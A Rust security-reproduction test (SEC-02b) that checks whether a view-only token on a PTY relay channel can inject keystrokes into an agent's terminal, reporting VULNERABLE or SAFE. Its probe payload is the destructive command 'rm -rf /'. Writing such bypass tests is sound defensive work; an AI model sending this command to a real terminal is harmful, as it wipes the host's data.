//! SEC-02b reproduction: a mode:"view" token bound to the PTY channel can send
//! keystroke Frame bytes to the agent — the same control bypass via the
//! terminal plane instead of DesktopInput.
...
fn viewer_token_view_pty() -> String {
    mint(
        "ogs_",
        &format!(
            r#"{{"workspaceId":"{WORKSPACE}","sessionId":"22222222-2222-4222-8222-222222222222","viewerId":"33333333-3333-4333-8333-333333333333","leaseEpoch":0,"mode":"view","port":{PTY_PORT},"exp":4102444800,"agentId":"{AGENT}","channelId":"{CHANNEL}"}}"#
        ),
    )
}
...
async fn sec02b_view_token_pty_input() {
    ...
    let url = format!("{base}?ws={WORKSPACE}&agent={AGENT}&port={PTY_PORT}&channel={CHANNEL}");
    ...
    println!("pty viewer ack accepted={}", ack.accepted);

    // Viewer sends a raw keystroke frame — equivalent of typing in the tty.
    let frame = RelayMessage::Frame(v1::StreamFrame {
        channel_id: CHANNEL.to_string(),
        seq: 1,
        data: prost::bytes::Bytes::from_static(b"rm -rf /\n"),
        produced_at_ms: 0,
    });
    socket
    ...
    match got {
        Ok(Ok(Some(RelayMessage::Frame(f)))) => {
            println!(
                "SEC02B_RESULT=VULNERABLE: view token typed {:?} into the pty",
                String::from_utf8_lossy(&f.data)
            );
        }
        Ok(Ok(Some(other))) => println!("SEC02B_RESULT=OTHER: {other:?}"),
        Ok(Ok(None)) => println!("SEC02B_RESULT=CLOSED"),
        Ok(Err(e)) => println!("SEC02B_RESULT=RECV_ERR: {e}"),
        Err(_) => println!("SEC02B_RESULT=SAFE: no pty input delivered within 3s"),
    }
    let _ = tx.send(());
}
